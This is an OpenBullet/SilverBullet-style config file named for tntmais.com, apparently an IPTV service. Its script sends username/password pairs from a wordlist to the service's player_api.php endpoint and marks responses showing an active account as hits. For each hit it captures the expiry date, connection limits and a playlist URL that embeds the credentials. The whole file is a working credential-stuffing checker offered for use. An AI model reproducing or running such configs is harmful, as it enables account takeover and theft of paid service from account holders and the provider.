[SETTINGS]
{
  "Name": "slz.play-tntmais",
  "SuggestedBots": 1,
  "MaxCPM": 0,
  "LastModified": "2022-01-13T21:35:19.1288188-03:00",
  "AdditionalInfo": "",
  "RequiredPlugins": [],
  "Author": "Josue",
  "Version": "1.1.0 [SB]",
  "SaveEmptyCaptures": false,
  "ContinueOnCustom": false,
  "SaveHitsToTextFile": false,
  "IgnoreResponseErrors": false,
  "MaxRedirects": 8,
  "NeedsProxies": false,
  "OnlySocks": false,
  "OnlySsl": false,
  "MaxProxyUses": 0,
  "BanProxyAfterGoodStatus": false,
  "BanLoopEvasionOverride": -1,
  "EncodeData": false,
  "AllowedWordlist1": "",
  "AllowedWordlist2": "",
  "DataRules": [],
  "CustomInputs": [],
  "CaptchaUrl": "",
  "IsBase64": false,
  "FilterList": [],
  "EvaluateMathOCR": false,
  "SecurityProtocol": 0,
  "ForceHeadless": false,
  "AlwaysOpen": false,
  "AlwaysQuit": false,
  "QuitOnBanRetry": false,
  "DisableNotifications": false,
  "DisableImageLoading": false,
  "DefaultProfileDirectory": false,
  "CustomUserAgent": "",
  "RandomUA": false,
  "CustomCMDArgs": ""
}

[SCRIPT]
REQUEST GET "http://tntmais.com:80/player_api.php?username=<USER>&password=<PASS>&type=m3u_plus" AutoRedirect=FALSE 
  
  HEADER "User-Agent: CPRO" 
  HEADER "Accept: */*" 
  HEADER "Range: bytes=0-" 
  HEADER "Connection: close" 
  HEADER "Host: tntmais.com:80" 
  HEADER "Icy-MetaData: 1" 

KEYCHECK 
  KEYCHAIN Failure OR 
    KEY "<RESPONSECODE>" Contains "404" 
  KEYCHAIN Success OR 
    KEY "\"status\":\"Active\"" 

PARSE "<SOURCE>" LR "exp_date\":n" "l,\"" -> VAR "Ilimitada" 

PARSE "<SOURCE>" LR "\"exp_date\":\"" "\"," -> VAR "Expira Em" 

FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<Expira Em>" -> CAP "Expira" 

FUNCTION Replace "<Ilimitada>" "Ilimitada" "<Ilimitada>" -> CAP "Expira" 

PARSE "<SOURCE>" LR "\"max_connections\":\"" "\"," CreateEmpty=FALSE -> CAP "C.Max" 

PARSE "<SOURCE>" LR "\"active_cons\":\"" "\"," CreateEmpty=FALSE -> CAP "C.Ativ" 

FUNCTION Replace "<PASS>" "http://tntmais.com:80/get.php?username=<USER>&password=<PASS>&type=m3u_plus" "<PASS>" -> CAP "Lista M3U" 

